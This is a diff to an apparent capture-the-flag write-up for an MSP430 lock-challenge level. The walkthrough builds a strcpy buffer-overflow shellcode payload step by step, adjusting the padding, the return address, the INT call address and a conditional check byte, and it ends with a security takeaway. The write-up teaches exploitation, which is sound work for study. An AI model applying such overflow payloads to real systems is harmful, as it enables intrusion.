@@ -51,7 +51,7 @@ So we know that we need to make sure the bytes match so we can reach the `ret` a
 
 ### strcpy & Building a Byte Sanitized Payload
 
-Refer back to the previous write up, `Montevideo`, for a detailed explanation of `strcpy` and `Building a Sanitized Payload`.
+Refer back to the previous write up, [`Montevideo`](montevideo.md#strcpy), for a detailed explanation of `strcpy` and `Building a Sanitized Payload`.
 
 ## Building an Updated Payload
 
@@ -88,8 +88,7 @@ We have to be inclusive of the final byte, so we can calculate the difference be
 
 So we know our payload will need to adjust the padding to properly align the return address
 
-```
-========================== Original Payload =============================
+<pre><code>========================== Original Payload =============================
 
 3f40    ff01   3f80   8001   0f12   b012   4c45   1111   ee43   ----
  
@@ -97,13 +96,13 @@ So we know our payload will need to adjust the padding to properly align the ret
 
 ========================== Adjusted Payload v1 =============================
 
-3f40    ff01   3f80   8001   0f12   b012   4c45   1111   1111   ee43
+3f40    ff01   3f80   8001   0f12   b012   4c45   1111   <a data-footnote-ref href="#user-content-fn-1">1111</a>   <a data-footnote-ref href="#user-content-fn-2">ee43</a>
  
 0x43ec 0x43ee 0x43f0 0x43f2 0x43f4 0x43f6 0x43f8 0x43fa 0x43fc 0x43fe
 
 
 New padding = 1111 1111
-```
+</code></pre>
 
 ### Adjust Location of INT call
 
@@ -113,41 +112,39 @@ In the previous payload we call `0x454c` to execute the `INT` function. If we ch
 
 Since we used absolute addressing in the `call` before, we just need to adjust the address used.
 
-```
-========================== Adjusted Payload v1 =============================
+<pre><code>========================== Adjusted Payload v1 =============================
 
-3f40    ff01   3f80   8001   0f12   b012   4c45   1111   1111   ee43
+3f40    ff01   3f80   8001   0f12   b012   <a data-footnote-ref href="#user-content-fn-3">4c45</a>   1111   1111   ee43
  
 0x43ec 0x43ee 0x43f0 0x43f2 0x43f4 0x43f6 0x43f8 0x43fa 0x43fc 0x43fe
 
 ========================== Adjusted Payload v2 =============================
 
-3f40    ff01   3f80   8001   0f12   b012   9445   1111   1111   ee43
+3f40    ff01   3f80   8001   0f12   b012   <a data-footnote-ref href="#user-content-fn-4">9445</a>   1111   1111   ee43
  
 0x43ec 0x43ee 0x43f0 0x43f2 0x43f4 0x43f6 0x43f8 0x43fa 0x43fc 0x43fe
 
-```
+</code></pre>
 
 ### Insert Conditional Passing Byte
 
 Finally, we can add our `0xb2` in the 17th byte slot of our payload to pass the `cmp` `jz` sequence which would end the program. Remember to account for the endianness!
 
-```
-========================== Adjusted Payload v2 =============================
+<pre><code>========================== Adjusted Payload v2 =============================
 
-3f40    ff01   3f80   8001   0f12   b012   9445   1111   1111   ee43
+3f40    ff01   3f80   8001   0f12   b012   9445   1111   <a data-footnote-ref href="#user-content-fn-5">1111</a>   ee43
  
 0x43ec 0x43ee 0x43f0 0x43f2 0x43f4 0x43f6 0x43f8 0x43fa 0x43fc 0x43fe
 
 ========================== Adjusted Payload v3 =============================
 
-3f40    ff01   3f80   8001   0f12   b012   9445   1111   11b2   ee43
+3f40    ff01   3f80   8001   0f12   b012   9445   1111   <a data-footnote-ref href="#user-content-fn-6">11b2</a>   ee43
  
 0x43ec 0x43ee 0x43f0 0x43f2 0x43f4 0x43f6 0x43f8 0x43fa 0x43fc 0x43fe
 
 0  1    2  3   4  5   6  7   8  9   10 11  12 13  14 15  16 17  18 19
 
-```
+</code></pre>
 
 ### Final Payload
 
@@ -185,3 +182,15 @@ The payload successfully unlocks the door.
 ### Security Takeaway
 
 Relying on arbitrary, easily visible byte comparisons such as checking if a specific byte in user input matches a hard-coded value to determine execution paths, does not constitute genuine security. When an attacker already controls the input buffer (as seen with the `strcpy` vulnerability), they can trivially embed the required bytes into their payload to bypass these validation checks and force the program down a vulnerable execution branch.
+
+[^1]: insert new padding
+
+[^2]: return address
+
+[^3]: old INT address
+
+[^4]: updated INT address
+
+[^5]: original padding
+
+[^6]: added custom byte
